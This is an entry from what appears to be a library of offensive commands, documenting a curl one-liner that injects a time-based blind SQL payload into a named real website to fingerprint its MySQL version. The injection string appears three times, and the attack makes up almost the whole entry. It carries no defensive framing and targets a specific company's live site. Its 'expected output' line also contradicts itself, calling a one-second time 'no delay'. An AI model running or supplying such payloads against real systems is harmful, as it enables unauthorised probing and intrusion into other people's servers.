---
id: cmd-uuid-005
data: >-
  time curl --data
  "ACT=55&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(MID(VERSION(),1,1)='4',SLEEP(1),0)
  AND group_id='1" https://news.starbucks.com
tags:
  - fingerprinting
  - mysql
type: command
output: null
executor: bash
platforms:
  - Linux
  - macOS
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T03:46:26.231Z'
verified: false
validated: true
submitted: true
---
# fingerprint-mysql-version-4

## Command

```bash
time curl --data "ACT=55&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(MID(VERSION(),1,1)='4',SLEEP(1),0) AND group_id='1" https://news.starbucks.com
```

## Description

Checks for MySQL version starting with '4' to contrast with '5' test.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `time` | Timing | Yes |
| `--data` | Payload with '4' check | Yes |

## Examples

### Basic Usage

```bash
time curl --data "ACT=55&jsontree={\"x\":1}&site_id=1&group_id=1'-IF(MID(VERSION(),1,1)='4',SLEEP(1),0) AND group_id='1" https://news.starbucks.com
```

## Expected Output

real 0m1.005s (no delay)

## Related

- [[commands/fingerprint-mysql-version-5]]
